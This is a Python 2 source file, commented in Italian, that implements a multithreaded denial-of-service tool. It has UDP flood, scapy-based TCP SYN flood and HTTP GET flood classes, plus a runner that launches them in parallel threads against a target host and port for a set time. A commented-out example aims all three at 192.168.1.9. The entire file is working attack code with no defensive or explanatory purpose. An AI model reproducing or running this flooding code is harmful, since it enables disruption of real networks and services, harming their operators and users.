import threading
import time
import random
from scapy.all import *
from socket import *

import logging 
logging.getLogger("scapy.runtime").setLevel(logging.ERROR) # Nasconde l'output degli errori di scapy su IPV6

bytes = random._urandom(128)

#############################################################################

class DOS:

	def __init__(self):
		pass

	def dos (self):
		print "Attacco dos iniziato..."

	def set (self, v, p, t, tn):
		self.v = v 			# Vittima
		self.p = p 			# Porta
		self.t = t 			# Tempo (in sec)
		self.tn = tn 		# Numero di thread paralleli
		


#############################################################################

class UDP_Flood (DOS):
	def dos (self):
		print "UDP_Flood Inzio: " + self.v + ":" + str(self.p)
		durata = time.time() + int(self.t)
		try:
			while 1:
			
				if time.time() > durata:
					break
				else:
					pass

				s = socket(AF_INET, SOCK_DGRAM)
				s.sendto(bytes, (self.v, int(self.p)))

			print "UDP_Flood Fine: " + self.v + ":" + str(self.p)
		except Exception, e:
			print str(e)

#############################################################################

class TCP_Flood (DOS):
	def dos (self):
		print "TCP_Flood Inzio: " + self.v + ":" + str(self.p)
		durata = time.time() + int(self.t)
		try:
			while 1:
				
				if time.time() > durata:
					break
				else:
					pass

				pkg=IP(dst=self.v)/TCP(flags="S", sport=RandShort(), dport=int(self.p)) #Crea il pacchetto
				send(pkg, verbose=0) #Invia il pacchetto

			print "TCP_Flood Fine: " + self.v + ":" + str(self.p)
		except Exception, e:
			print str(e)

#############################################################################

class HTTP_Flood (DOS):
	def dos (self):
		print "HTTP_Flood Inzio: " + self.v + ":" + str(self.p)
		durata = time.time() + int(self.t)
		try:
			while 1:
			
				if time.time() > durata:
					break
				else:
					pass

				s = socket(AF_INET, SOCK_STREAM)
				s.settimeout(1)
				s.connect ((self.v, int(self.p)))	

				#useragent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36"
				#payload = "GET / HTTP/1.0\r\nPragma: no-cache\r\nCache-Control: no-cache\r\nHost: " + v + "\r\nConnection: Keep-alive\r\nAccept-Encoding: gzip,deflate\r\nUser-Agent: " + useragent + "\r\nAccept: */*\r\n"
				payload = "GET / HTTP/1.0\r\nHost: " + self.v + "\r\n\r\n"
				s.sendto(payload, (self.v, int(self.p)))

				s.close()

			print "HTTP_Flood Fine: " + self.v + ":" + str(self.p)
		except Exception, e:
			print str(e)

#############################################################################

class Pila:
	def __init__(self):
		self.items = []

	def isEmpty(self):
		return self.items == []

	def push(self, item):
		self.items.append(item)

	def pop(self):
		return self.items.pop()

	def size(self):
		return len(self.items)

	def delete (self):
		self.items = []



class Attack:
	def __init__(self, pila):
		self.p = pila

	def att (self):
		while self.p.size() > 0:
			nodo = self.p.pop()
			for i in range (1, int(nodo.tn) + 1):
				t = threading.Thread(target=nodo.dos)
				t.start()



'''
a = UDP_Flood()
a.set("192.168.1.9", "4000", "12", "2")

b = TCP_Flood()
b.set("192.168.1.9", "80", "12", "2")

c = HTTP_Flood()
c.set("192.168.1.9", "80", "12", "2")


p.push (b)
p.push (a)
p.push (c)



x = Attack(p)
x.att()
'''


